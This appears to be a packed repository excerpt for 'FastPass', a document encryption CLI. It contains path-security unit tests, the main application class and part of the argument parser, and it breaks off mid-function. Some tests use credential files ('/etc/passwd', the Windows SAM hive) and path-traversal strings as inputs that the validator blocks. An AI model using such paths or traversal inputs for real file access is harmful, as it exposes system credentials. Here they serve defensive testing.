        home_dir = Path.home().resolve(strict=False)
        assert home_dir in validator.allowed_directories
    
    def test_allowed_directories_includes_temp(self):
        """Test: Allowed directories includes temp directory"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        # Should include temp directory
        import tempfile
        temp_dir = Path(tempfile.gettempdir()).resolve(strict=False)
        assert temp_dir in validator.allowed_directories
    
    def test_allowed_directories_includes_cwd(self):
        """Test: Allowed directories includes current working directory by default"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        # Should include current working directory
        cwd = Path.cwd().resolve(strict=False)
        assert cwd in validator.allowed_directories
    
    def test_custom_allowed_directories(self):
        """Test: Custom allowed directories are respected"""
        logger = MagicMock()
        import tempfile
        temp_dir = str(Path(tempfile.gettempdir()).resolve(strict=False))
        custom_dirs = {temp_dir}
        validator = SecurityValidator(logger, allowed_directories=custom_dirs)
        
        # Should include custom directory and temp directory (always added)
        temp_path = Path(tempfile.gettempdir()).resolve(strict=False)
        assert temp_path in validator.allowed_directories
        
        # Should not include home directory when custom directories are specified
        home_dir = Path.home().resolve(strict=False)
        # Home is only excluded if it's not in the custom list
        if str(home_dir) not in custom_dirs:
            assert home_dir not in validator.allowed_directories


class TestPathResolutionValidation:
    """Test path resolution and basic validation"""
    
    def test_validate_existing_file_path(self, temp_work_dir):
        """Test: Valid existing file passes validation"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        # Create a test file
        test_file = temp_work_dir / "test.pdf"
        test_file.write_text("test content")
        
        result = validator.validate_file_path(test_file)
        assert result == test_file.resolve(strict=False)
    
    def test_validate_nonexistent_file_error(self):
        """Test: Non-existent file raises error"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        nonexistent_file = Path("/nonexistent/path/file.pdf")
        
        with pytest.raises(SecurityViolationError, match="File not found"):
            validator.validate_file_path(nonexistent_file)
    
    def test_validate_path_expansion(self, temp_work_dir):
        """Test: Path expansion (~ handling) works correctly"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        # Create test file in temp (which is allowed)
        test_file = temp_work_dir / "test.pdf"
        test_file.write_text("test content")
        
        # Should handle path expansion
        result = validator.validate_file_path(test_file)
        assert result.is_absolute()


class TestSymlinkDetection:
    """Test symbolic link detection and blocking"""
    
    def test_validate_symlink_file_blocked(self, temp_work_dir):
        """Test: Symbolic link files are blocked"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        # Create a regular file
        real_file = temp_work_dir / "real_file.pdf"
        real_file.write_text("test content")
        
        # Create a symlink (skip on Windows if not supported)
        symlink_file = temp_work_dir / "symlink_file.pdf"
        try:
            symlink_file.symlink_to(real_file)
            
            with pytest.raises(SecurityViolationError, match="Symbolic links are not allowed"):
                validator.validate_file_path(symlink_file)
        except OSError:
            pytest.skip("Symlinks not supported on this system")
    
    def test_validate_symlink_parent_directory_blocked(self, temp_work_dir):
        """Test: Files in symlinked directories are blocked"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        # Create a real directory with a file
        real_dir = temp_work_dir / "real_dir"
        real_dir.mkdir()
        real_file = real_dir / "test.pdf"
        real_file.write_text("test content")
        
        # Create a symlinked directory (skip on Windows if not supported)
        symlink_dir = temp_work_dir / "symlink_dir"
        try:
            symlink_dir.symlink_to(real_dir)
            symlink_file = symlink_dir / "test.pdf"
            
            with pytest.raises(SecurityViolationError, match="Path contains symbolic link"):
                validator.validate_file_path(symlink_file)
        except OSError:
            pytest.skip("Symlinks not supported on this system")


class TestPathLengthValidation:
    """Test path length validation"""
    
    def test_validate_normal_path_length(self, temp_work_dir):
        """Test: Normal path length passes validation"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        test_file = temp_work_dir / "normal_length_file.pdf"
        test_file.write_text("test content")
        
        # Should not raise exception
        validator.validate_file_path(test_file)
    
    def test_validate_very_long_path_blocked(self):
        """Test: Very long paths are blocked"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        # Create a path longer than 260 characters
        long_path_parts = ["very_long_directory_name_" + "x" * 50] * 10
        long_path = Path("/") / Path(*long_path_parts) / "file.pdf"
        
        # Should be blocked due to length
        # Note: This test may not trigger on all systems due to path resolution
        if len(str(long_path)) > 260:
            with pytest.raises(SecurityViolationError, match="Path too long"):
                validator.validate_file_path(long_path)


class TestPathCharacterValidation:
    """Test path character validation"""
    
    def test_validate_null_byte_blocked(self):
        """Test: Null bytes in paths are blocked"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        # Path with null byte
        null_byte_path = Path("test\x00file.pdf")
        
        with pytest.raises(SecurityViolationError, match="null bytes or control characters"):
            validator.validate_file_path(null_byte_path)
    
    def test_validate_control_characters_blocked(self):
        """Test: Control characters in paths are blocked"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        # Path with control character
        control_char_path = Path("test\x01file.pdf")
        
        with pytest.raises(SecurityViolationError, match="null bytes or control characters"):
            validator.validate_file_path(control_char_path)
    
    def test_validate_normal_characters_allowed(self, temp_work_dir):
        """Test: Normal characters are allowed"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        test_file = temp_work_dir / "normal_file_123.pdf"
        test_file.write_text("test content")
        
        # Should not raise exception
        validator.validate_file_path(test_file)


class TestDirectoryContainmentValidation:
    """Test strict directory containment validation"""
    
    def test_validate_file_in_allowed_directory(self, temp_work_dir):
        """Test: Files in allowed directories pass validation"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        test_file = temp_work_dir / "test.pdf"
        test_file.write_text("test content")
        
        # Temp directory should be allowed
        validator.validate_file_path(test_file)
    
    def test_validate_file_outside_allowed_directories_blocked(self):
        """Test: Files outside allowed directories are blocked"""
        logger = MagicMock()
        # Create validator with only temp directory allowed for testing
        import tempfile
        temp_dir = Path(tempfile.gettempdir()).resolve(strict=False)
        validator = SecurityValidator(logger, allowed_directories={str(temp_dir)})
        
        # Try to access a file outside the explicitly allowed directories
        # This test may be system-dependent
        restricted_path = Path("/etc/passwd")  # Unix system file
        if restricted_path.exists():
            with pytest.raises(SecurityViolationError, match="outside security boundaries"):
                validator.validate_file_path(restricted_path)
        else:
            # Windows equivalent
            restricted_path = Path("C:/Windows/System32/config/SAM")
            if restricted_path.exists():
                with pytest.raises(SecurityViolationError, match="outside security boundaries"):
                    validator.validate_file_path(restricted_path)
            else:
                pytest.skip("No system files available for testing")
    
    def test_containment_check_exact_boundary(self, temp_work_dir):
        """Test: Files at exact directory boundary are handled correctly"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        # Test file at temp directory root
        test_file = temp_work_dir / "boundary_test.pdf"
        test_file.write_text("test content")
        
        # Should be allowed (not at boundary, but inside allowed directory)
        validator.validate_file_path(test_file)


class TestPathComponentValidation:
    """Test individual path component validation"""
    
    def test_validate_safe_path_components(self):
        """Test: Safe path components pass validation"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        safe_components = [
            "normal_file.pdf",
            "file_with_numbers_123.pdf",
            "file-with-dashes.pdf",
            "file_with_underscores.pdf"
        ]
        
        for component in safe_components:
            assert validator._is_path_component_safe_strict(component) is True
    
    def test_validate_path_traversal_components_blocked(self):
        """Test: Path traversal components are blocked"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        dangerous_components = [
            "..",
            "..\\",
            "../",
            "~"
        ]
        
        for component in dangerous_components:
            assert validator._is_path_component_safe_strict(component) is False
    
    def test_validate_windows_reserved_names_blocked(self):
        """Test: Windows reserved names are blocked"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        reserved_names = [
            "CON", "PRN", "AUX", "NUL",
            "COM1", "COM2", "COM9",
            "LPT1", "LPT2", "LPT9"
        ]
        
        for name in reserved_names:
            assert validator._is_path_component_safe_strict(name) is False
            assert validator._is_path_component_safe_strict(name.lower()) is False
    
    def test_validate_hidden_files_blocked(self):
        """Test: Hidden files (starting with .) are blocked"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        hidden_files = [
            ".hidden_file",
            ".secret",
            ".bashrc"
        ]
        
        for filename in hidden_files:
            assert validator._is_path_component_safe_strict(filename) is False
        
        # But allow current directory reference
        assert validator._is_path_component_safe_strict(".") is True
    
    def test_validate_dangerous_characters_blocked(self):
        """Test: Dangerous characters in components are blocked"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        dangerous_chars = ['<', '>', '"', '|', '?', '*']
        
        for char in dangerous_chars:
            filename = f"file{char}name.pdf"
            assert validator._is_path_component_safe_strict(filename) is False
    
    def test_validate_windows_drive_letters_allowed(self):
        """Test: Windows drive letters are allowed"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        drive_letters = ["C:", "D:", "E:", "Z:"]
        
        for drive in drive_letters:
            assert validator._is_path_component_safe_strict(drive) is True
    
    def test_validate_excessively_long_components_blocked(self):
        """Test: Excessively long path components are blocked"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        # Component longer than 255 characters
        long_component = "a" * 256 + ".pdf"
        assert validator._is_path_component_safe_strict(long_component) is False
        
        # Component exactly 255 characters should be allowed
        max_component = "a" * 251 + ".pdf"  # 255 total
        assert validator._is_path_component_safe_strict(max_component) is True
    
    def test_validate_leading_trailing_spaces_dots_blocked(self):
        """Test: Leading/trailing spaces and dots are blocked"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        problematic_names = [
            " leading_space.pdf",
            "trailing_space .pdf",
            ".leading_dot",
            "trailing_dot.",
            "  multiple_spaces  "
        ]
        
        for name in problematic_names:
            assert validator._is_path_component_safe_strict(name) is False


class TestFileSecurityValidation:
    """Test file-level security validation"""
    
    def test_validate_regular_file_allowed(self, temp_work_dir):
        """Test: Regular files are allowed"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        test_file = temp_work_dir / "regular_file.pdf"
        test_file.write_text("test content")
        
        result = validator._is_file_in_secure_zone(test_file.resolve(strict=False))
        assert result is True
    
    def test_validate_directory_blocked(self, temp_work_dir):
        """Test: Directories are blocked (only files allowed)"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        test_dir = temp_work_dir / "test_directory"
        test_dir.mkdir()
        
        result = validator._is_file_in_secure_zone(test_dir.resolve(strict=False))
        assert result is False
    
    @pytest.mark.skipif(os.name == 'nt', reason="SUID/SGID not supported on Windows")
    def test_validate_suid_files_blocked(self, temp_work_dir):
        """Test: SUID files are blocked on Unix systems"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        test_file = temp_work_dir / "suid_file.pdf"
        test_file.write_text("test content")
        
        # Mock file stat to simulate SUID bit
        with patch.object(test_file, 'stat') as mock_stat:
            mock_stat.return_value.st_mode = stat.S_IFREG | stat.S_ISUID
            
            result = validator._is_file_in_secure_zone(test_file.resolve(strict=False))
            assert result is False
    
    @pytest.mark.skipif(os.name != 'nt', reason="Windows-specific test")
    def test_validate_windows_permissions_allowed(self, temp_work_dir):
        """Test: Windows file permissions don't trigger Unix-specific checks"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        test_file = temp_work_dir / "windows_file.pdf"
        test_file.write_text("test content")
        
        # On Windows, SUID/SGID checks should be skipped
        result = validator._is_file_in_secure_zone(test_file.resolve(strict=False))
        assert result is True
    
    @pytest.mark.skipif(os.name == 'nt', reason="SGID not supported on Windows")
    def test_validate_sgid_files_blocked(self, temp_work_dir):
        """Test: SGID files are blocked on Unix systems"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        test_file = temp_work_dir / "sgid_file.pdf"
        test_file.write_text("test content")
        
        # Mock file stat to simulate SGID bit
        with patch.object(test_file, 'stat') as mock_stat:
            mock_stat.return_value.st_mode = stat.S_IFREG | stat.S_ISGID
            
            result = validator._is_file_in_secure_zone(test_file.resolve(strict=False))
            assert result is False
    
    def test_validate_permission_check_failure_blocked(self, temp_work_dir):
        """Test: Files with permission check failures are blocked"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        test_file = temp_work_dir / "permission_fail.pdf"
        test_file.write_text("test content")
        
        # Mock stat to raise exception
        with patch.object(test_file, 'stat', side_effect=PermissionError("Access denied")):
            result = validator._is_file_in_secure_zone(test_file.resolve(strict=False))
            assert result is False


class TestOutputDirectoryValidation:
    """Test output directory validation"""
    
    def test_validate_output_directory_none(self):
        """Test: None output directory returns None"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        result = validator.validate_output_directory(None)
        assert result is None
    
    def test_validate_output_directory_valid(self, temp_work_dir):
        """Test: Valid output directory passes validation"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        output_dir = temp_work_dir / "output"
        
        result = validator.validate_output_directory(output_dir)
        assert result == output_dir.resolve()
        assert output_dir.exists()
        assert output_dir.is_dir()
    
    def test_validate_output_directory_outside_boundaries_blocked(self):
        """Test: Output directory outside boundaries is blocked"""
        logger = MagicMock()
        # Create validator with only temp directory allowed for testing
        import tempfile
        temp_dir = Path(tempfile.gettempdir()).resolve(strict=False)
        validator = SecurityValidator(logger, allowed_directories={str(temp_dir)})
        
        # Try to create output in restricted location
        restricted_output = Path("/etc/output")  # Unix restricted location
        
        with pytest.raises(SecurityViolationError, match="Output directory outside security boundaries"):
            validator.validate_output_directory(restricted_output)
    
    def test_validate_output_directory_creation_failure(self, temp_work_dir):
        """Test: Output directory creation failure is handled"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        # Try to create directory in read-only location
        output_dir = temp_work_dir / "readonly" / "output"
        readonly_parent = temp_work_dir / "readonly"
        readonly_parent.mkdir()
        
        # Make parent read-only (may not work on all systems)
        try:
            readonly_parent.chmod(0o444)
            
            with pytest.raises(SecurityViolationError, match="Cannot create output directory"):
                validator.validate_output_directory(output_dir)
        except:
            pytest.skip("Cannot make directory read-only on this system")
        finally:
            # Restore permissions for cleanup
            try:
                readonly_parent.chmod(0o755)
            except:
                pass


class TestSecurityValidationEdgeCases:
    """Test edge cases and error conditions in security validation"""
    
    def test_validate_path_resolution_failure(self):
        """Test: Path resolution failure is handled gracefully"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        # Create a path that will fail resolution
        with patch.object(Path, 'resolve', side_effect=OSError("Resolution failed")):
            test_path = Path("failing_path.pdf")
            
            with pytest.raises(SecurityViolationError, match="Path resolution failed"):
                validator.validate_file_path(test_path)
    
    def test_validate_unicode_path_handling(self, temp_work_dir):
        """Test: Unicode paths are handled correctly"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        # Create file with unicode name
        unicode_file = temp_work_dir / "тест_файл.pdf"
        unicode_file.write_text("test content", encoding='utf-8')
        
        # Should handle unicode correctly
        result = validator.validate_file_path(unicode_file)
        assert result.exists()
    
    def test_validate_case_sensitivity_handling(self, temp_work_dir):
        """Test: Case sensitivity is handled correctly"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        # Test Windows reserved names in different cases
        test_cases = ["con.pdf", "CON.pdf", "Con.pdf"]
        
        for case in test_cases:
            assert validator._is_path_component_safe_strict(case) is False
    
    def test_validate_empty_path_components(self):
        """Test: Empty path components are handled"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        # Empty component should be invalid
        assert validator._is_path_component_safe_strict("") is False
    
    def test_validate_boundary_conditions(self, temp_work_dir):
        """Test: Boundary conditions in validation"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        # Test exactly at path length limit
        boundary_name = "a" * 251 + ".pdf"  # Exactly 255 chars
        assert validator._is_path_component_safe_strict(boundary_name) is True
        
        # Test just over the limit
        over_limit_name = "a" * 252 + ".pdf"  # 256 chars
        assert validator._is_path_component_safe_strict(over_limit_name) is False
</file>

<file path="src/app.py">
"""
FastPass Main Application
Maps to: A5a-A5g FastPass Application Initialization and main processing flow
"""

# A1a: Load System Tools
import sys
import atexit
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, List
import logging

from src.utils.config import FastPassConfig
from src.utils.logger import sanitize_error_message


class FastPassApplication:
    """
    A5a: Create FastPassApplication Class
    Main application class that orchestrates the entire FastPass workflow
    """
    
    def __init__(self, args, logger: logging.Logger, config: Dict[str, Any]):
        """
        A5b: Initialize Instance Variables
        Store command-line arguments, logger, and configuration
        """
        self.args = args
        self.logger = logger
        self.config = config
        
        # A5c: Initialize Tracking Lists
        self.temp_files_created = []
        self.processing_results = {}
        
        # A5d: Record Operation Start Time
        self.operation_start_time = datetime.now()
        
        # A5e: Initialize Password Manager
        from src.core.password.password_manager import PasswordManager
        self.password_manager = PasswordManager(
            cli_passwords=getattr(args, 'password', []) or [],
            password_list_file=getattr(args, 'password_list', None),
            stdin_mapping=getattr(args, 'stdin_password_mapping', None)
        )
        
        # A5f: Set Application State Flags
        self.ready_for_processing = True
        self.cleanup_required = True
        
        # A5g: Log Application Initialized
        self.logger.debug('FastPass application initialized')
        
        # Register cleanup handler
        atexit.register(self._emergency_cleanup)
    
    def run(self) -> int:
        """
        Main execution flow following the complete flowchart
        Returns exit code (0=success, 1=error, 2=invalid args, 3=security, 4=password)
        """
        try:
            # A4a-A4e: Crypto Tool Detection
            self._check_crypto_tools()
            
            # Section B: Security & File Validation
            validated_files = self._perform_security_and_file_validation()
            
            # Section C: Crypto Tool Setup & Configuration
            crypto_handlers = self._setup_crypto_tools_and_configuration(validated_files)
            
            # Section D: File Processing & Operations
            processing_results = self._process_files_with_crypto_operations(
                validated_files, crypto_handlers
            )
            
            # Section E: Cleanup & Results Reporting
            exit_code = self._cleanup_and_generate_final_report(processing_results)
            
            return exit_code
            
        except SecurityViolationError as e:
            self.logger.error(f"Security violation: {sanitize_error_message(str(e))}")
            return 3
        except FileFormatError as e:
            self.logger.error(f"File format error: {sanitize_error_message(str(e))}")
            return 1
        except CryptoToolError as e:
            self.logger.error(f"Crypto tool error: {sanitize_error_message(str(e))}")
            return 1
        except PasswordError as e:
            self.logger.error(f"Password error: {sanitize_error_message(str(e))}")
            return 4
        except ProcessingError as e:
            self.logger.error(f"Processing error: {sanitize_error_message(str(e))}")
            self._cleanup_partial_processing_on_failure()
            return 1
        except Exception as e:
            self.logger.error(f"Unexpected error: {sanitize_error_message(str(e))}")
            self._emergency_cleanup()
            return 2
    
    def _check_crypto_tools(self) -> None:
        """
        A4a-A4e: Crypto Tool Detection
        Check if all required crypto tools are available
        """
        # A4a: Load Encryption Tool Support
        crypto_tools = {}
        missing_tools = []
        
        # A4b: Check Office Document Tool
        try:
            import msoffcrypto
            crypto_tools['msoffcrypto'] = True
            self.logger.debug("Office document tool available")
        except ImportError:
            missing_tools.append('msoffcrypto-tool')
            self.logger.warning("msoffcrypto-tool not available")
        
        # A4c: Check PDF Processing Tool
        try:
            import PyPDF2
            crypto_tools['PyPDF2'] = True
            self.logger.debug("PDF processing tool available")
        except ImportError:
            missing_tools.append('PyPDF2')
            self.logger.warning("PyPDF2 not available")
        
        # A4e: Validate All Tools Present
        if missing_tools:
            raise CryptoToolError(f"Missing required tools: {missing_tools}")
        
        self.crypto_tools = crypto_tools
    
    def _perform_security_and_file_validation(self) -> List:
        """
        Section B: Security & File Validation
        Perform comprehensive security checks and file validation
        """
        from src.core.security import SecurityValidator
        from src.core.file_handler import FileValidator
        
        # B1a-B1c: Initialize and determine files to process
        allowed_dirs = getattr(self.args, 'allowed_dirs', None)
        security_validator = SecurityValidator(self.logger, allowed_dirs)
        file_validator = FileValidator(self.logger, self.config)
        
        # Validate output directory if specified
        if hasattr(self.args, 'output_dir') and self.args.output_dir:
            validated_output_dir = security_validator.validate_output_directory(self.args.output_dir)
            # Update args with validated output directory
            self.args.output_dir = validated_output_dir
        
        # Determine input files
        if hasattr(self.args, 'input') and self.args.input:
            files_to_process = self.args.input
        elif hasattr(self.args, 'recursive') and self.args.recursive:
            files_to_process = self._collect_files_recursively(self.args.recursive)
        else:
            raise ValueError("No input files specified")
        
        validated_files = []
        
        # Process each file
        for file_path in files_to_process:
            try:
                # B1e-B2e: Security validation
                security_validator.validate_file_path(file_path)
                
                # B3a-B5c: File format and content validation (allow unsupported for batch processing)
                file_manifest = file_validator.validate_file(file_path, allow_unsupported=True)
                
                validated_files.append(file_manifest)
                
            except SecurityViolationError as e:
                self.logger.error(f"Security validation failed for {file_path}: {e}")
                # Continue with other files
            except FileFormatError as e:
                self.logger.error(f"File format validation failed for {file_path}: {e}")
                # Continue with other files
        
        if not validated_files:
            raise FileFormatError("No valid files found to process")
        
        self.logger.info(f"Validated {len(validated_files)} files for processing")
        return validated_files
    
    def _collect_files_recursively(self, directory: Path) -> List[Path]:
        """
        B1c_Recursive: Collect Files Recursively
        Walk directory tree for supported formats
        """
        files = []
        try:
            for pattern in FastPassConfig.SUPPORTED_FORMATS.keys():
                files.extend(directory.rglob(f"*{pattern}"))
        except Exception as e:
            raise FileFormatError(f"Error collecting files from {directory}: {e}")
        
        return files
    
    def _setup_crypto_tools_and_configuration(self, validated_files: List) -> Dict:
        """
        Section C: Crypto Tool Setup & Configuration
        Initialize and configure crypto handlers
        """
        from src.core.crypto_handlers.office_handler import OfficeDocumentHandler
        from src.core.crypto_handlers.pdf_handler import PDFHandler
        
        # C1a-C1d: Analyze required tools and initialize handlers
        required_tools = set(manifest.crypto_tool for manifest in validated_files)
        crypto_handlers = {}
        
        if 'msoffcrypto' in required_tools:
            crypto_handlers['msoffcrypto'] = OfficeDocumentHandler(self.logger)
        
        if 'PyPDF2' in required_tools:
            crypto_handlers['PyPDF2'] = PDFHandler(self.logger)
        
        # C2a-C2b: Configure handlers
        for handler in crypto_handlers.values():
            handler.configure(self.config)
        
        self.logger.debug(f"Initialized {len(crypto_handlers)} crypto handlers")
        return crypto_handlers
    
    def _process_files_with_crypto_operations(self, validated_files: List, crypto_handlers: Dict) -> Dict:
        """
        Section D: File Processing & Operations
        Process files with crypto operations
        """
        from src.core.file_handler import FileProcessor
        
        processor = FileProcessor(
            logger=self.logger,
            config=self.config,
            password_manager=self.password_manager,
            crypto_handlers=crypto_handlers,
            temp_files_created=self.temp_files_created
        )
        
        # Check for dry-run and verify modes
        dry_run = getattr(self.args, 'dry_run', False)
        verify = getattr(self.args, 'verify', False)
        
        if dry_run:
            self.logger.info("DRY RUN MODE: Simulating operations without making changes")
        if verify:
            self.logger.info("VERIFY MODE: Performing deep verification of processed files")
        
        return processor.process_files(validated_files, self.args.operation, self.args.output_dir, dry_run=dry_run, verify=verify)
    
    def _cleanup_and_generate_final_report(self, processing_results: Dict) -> int:
        """
        Section E: Cleanup & Results Reporting
        Generate reports and determine exit code
        """
        from src.core.file_handler import ResultsReporter
        
        # E1a-E1e: Calculate processing metrics
        reporter = ResultsReporter(self.logger, self.operation_start_time)
        
        # E2a-E2f: Enhanced cleanup
        self._perform_cleanup()
        
        # E3a-E3d: Sensitive data clearing
        self._clear_sensitive_data()
        
        # E4a-E5d: Report generation and exit code determination
        return reporter.generate_report(processing_results)
    
    def _perform_cleanup(self) -> None:
        """
        E2a-E2f: Enhanced Cleanup with Retry and Secure Deletion
        Clean up temporary files and directories
        """
        for temp_file in self.temp_files_created:
            try:
                if temp_file.exists():
                    temp_file.unlink()
                    self.logger.debug(f"Cleaned up temp file: {temp_file}")
            except Exception as e:
                self.logger.warning(f"Failed to remove temp file {temp_file}: {e}")
    
    def _clear_sensitive_data(self) -> None:
        """
        E3a-E3d: Enhanced Sensitive Data Clearing
        Clear passwords and sensitive data from memory
        """
        # Clear password manager
        if hasattr(self, 'password_manager'):
            self.password_manager.clear_passwords()
            del self.password_manager
        
        # Clear CLI arguments containing passwords
        if hasattr(self.args, 'password'):
            self.args.password = None
        
        # Force garbage collection
        import gc
        gc.collect()
    
    def _cleanup_partial_processing_on_failure(self) -> None:
        """Cleanup when processing fails partway through"""
        self._perform_cleanup()
    
    def _emergency_cleanup(self) -> None:
        """Emergency cleanup for unexpected termination"""
        try:
            self._perform_cleanup()
        except Exception:
            pass  # Ignore errors during emergency cleanup


# Import exception classes from centralized module
from src.exceptions import (
    SecurityViolationError, FileFormatError, CryptoToolError, 
    PasswordError, FileProcessingError, ProcessingError
)
</file>

<file path="src/cli.py">
"""
FastPass CLI Argument Parsing and Validation
Maps to: Section A - DETAILED CLI PARSING from flowchart
"""

# A1a: Load System Tools
import argparse
import sys
import json
from pathlib import Path
from typing import List, Optional, Dict, Any

from src.utils.config import FastPassConfig
from src.utils.logger import setup_logger, sanitize_error_message
from src.app import FastPassApplication


def parse_command_line_arguments() -> argparse.Namespace:
    """
    A1b: Initialize Command Reader
    Create a system to understand user commands
    Set up FastPass name and help description
    """
    parser = argparse.ArgumentParser(
        prog="fast_pass",
        description="FastPass - Universal file encryption and decryption tool",
        epilog="""
Examples:
  fast_pass encrypt -i contract.docx -p "mypassword"
  fast_pass decrypt -i file1.pdf file2.docx -p "shared_pwd"
  fast_pass decrypt -r ./encrypted_docs/ -p "main_password"
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    # A1g: Add Helper Features with Enhanced Logging  
    parser.add_argument(
        '--list-supported',
        action='store_true',
        help='List supported file formats'
    )
    
    parser.add_argument(
        '--version',
        action='version',
        version=f'FastPass {FastPassConfig.VERSION}'
    )
    
    # A1c: Define Main Operation Choice
    # User must choose either encrypt OR decrypt
    # Cannot do both operations simultaneously
    subparsers = parser.add_subparsers(dest='operation', help='Operation to perform')
    subparsers.required = False  # Allow for info commands first
    
    # Encrypt operation
    encrypt_parser = subparsers.add_parser('encrypt', help='Add password protection to files')
    setup_common_arguments(encrypt_parser)
    # Add recursive option to encrypt (will be blocked in validation)
    encrypt_parser.add_argument(
        '-r', '--recursive',
        type=Path,
        help='Process directory recursively (not supported for encrypt)'
    )
    
    # Decrypt operation  
    decrypt_parser = subparsers.add_parser('decrypt', help='Remove password protection from files')
    setup_common_arguments(decrypt_parser)
    
    # Add recursive option to decrypt
    decrypt_parser.add_argument(
        '-r', '--recursive',
        type=Path,
        help='Process directory recursively (decrypt/check-password only)'
    )
    
    # Check password operation
    check_parser = subparsers.add_parser('check-password', help='Check if files require passwords')
    setup_common_arguments(check_parser)
    check_parser.add_argument(
        '-r', '--recursive',
        type=Path,
        help='Process directory recursively'
    )
    
    # Note: encrypt parser deliberately does not have -r option for security
    
    
    return parser.parse_args()


def setup_common_arguments(parser: argparse.ArgumentParser) -> None:
    """Setup arguments common to all operations"""
    
    # A1d: Set Up File Input Options
    # Use -i/--input flag for space-delimited files
    # Require explicit file specification with quotes for spaced paths
    parser.add_argument(
        '-i', '--input',
        nargs='+',
        type=Path,
        help='Files to process (space-delimited, quotes for spaces)'
    )
    
    # A1e: Configure Password Options with Space Delimitation
    # Accept space-delimited passwords with -p flag
    # Support password file and JSON stdin options
    parser.add_argument(
        '-p', '--password',
        nargs='+',
        help='Passwords to try (space-delimited, quotes for spaces, or "stdin" for JSON)'
    )
    
    parser.add_argument(
        '--password-list',
        type=Path,
        help='Text file with passwords to try (one per line)'
    )
    
    # A1f: Set Output Location Options
    # Choose where processed files should be saved
    # Default: replace original files in same location
    parser.add_argument(
        '-o', '--output-dir',
        type=Path,
        help='Output directory (default: in-place modification)'
    )
    
    # A1g: Add Helper Features
    parser.add_argument(
        '--dry-run',
        action='store_true',
        help='Show what would be done without making changes'
    )
    
    parser.add_argument(
        '--verify',
        action='store_true',
        help='Deep verification of processed files'
    )
    
    # Security configuration
    parser.add_argument(
        '--allowed-dirs',
        nargs='+',
        type=str,
        help='Additional directories to allow for file access (default: home directory and current working directory)'
    )
    
    parser.add_argument(
        '--debug',
        action='store_true',
        help='Enable detailed logging and debug output'
    )
    
    parser.add_argument(
        '--log-file',
        type=Path,
        help='Log file path for detailed logging'
    )


def display_information_and_exit(args: argparse.Namespace) -> int:
    """
    A1i: Handle Information Requests
    Check if user wants to see supported file formats
    Show list and exit if that's all they wanted
    """
    if getattr(args, 'list_supported', False):
        # A1i_List: Show Supported File Types
        print("FastPass Supported File Formats:")
        print("\nModern Office Documents (experimental encryption, full decryption):")
        office_formats = [ext for ext, tool in FastPassConfig.SUPPORTED_FORMATS.items() 
                         if tool == 'msoffcrypto']
        for fmt in sorted(office_formats):
            print(f"  {fmt}")
        
        print("\nPDF Documents (full encryption and decryption support):")
        pdf_formats = [ext for ext, tool in FastPassConfig.SUPPORTED_FORMATS.items() 
                      if tool == 'PyPDF2']
        for fmt in sorted(pdf_formats):
            print(f"  {fmt}")
        
        print("\nLegacy Office Formats (NOT SUPPORTED):")
        print("  .doc, .xls, .ppt (use Office to convert to modern format)")
        
        return 0
    
    return 0


def validate_arguments(args: argparse.Namespace) -> None:
    """
    A2a: Check Input Requirements
    User must specify either files or folder to process
    Cannot proceed without something to work on
    """
    
    # Skip validation for info commands
    if getattr(args, 'list_supported', False):
        return
    
    # Must have an operation for non-info commands
    if not args.operation:
        raise ValueError("Must specify an operation (encrypt, decrypt, or check-password)")
    
    # A2a_Check: Valid Input Method Provided?
    has_files = hasattr(args, 'input') and args.input
    has_recursive = hasattr(args, 'recursive') and args.recursive
    
    if not has_files and not has_recursive:
        # A2a_Error: Nothing to Process
        raise ValueError("Must specify either files (-i) or recursive directory (-r)")
    
    if has_files and has_recursive:
        # A2a_Both_Error: Conflicting Instructions
        raise ValueError("Cannot specify both individual files and recursive directory")
    
    # A2a1: Validate Recursive Mode Usage
    # Check if recursive mode used with encrypt operation
    # Recursive mode only allowed with decrypt/check-password
    if has_recursive and args.operation == 'encrypt':
        # A2a1_Error: Recursive Encryption Blocked
        raise ValueError("Recursive mode only supported for decrypt operations (security restriction)")
    
    # Validate password requirements
    has_passwords = (hasattr(args, 'password') and args.password) or \
                   (hasattr(args, 'password_list') and args.password_list)
    
    if not has_passwords and args.operation != 'check-password':
        raise ValueError("Must specify passwords (-p) or password list (--password-list)")


def handle_stdin_passwords(args: argparse.Namespace) -> None:
    """
    A3d: Handle Stdin Password Input
    Check for 'stdin' in CLI passwords
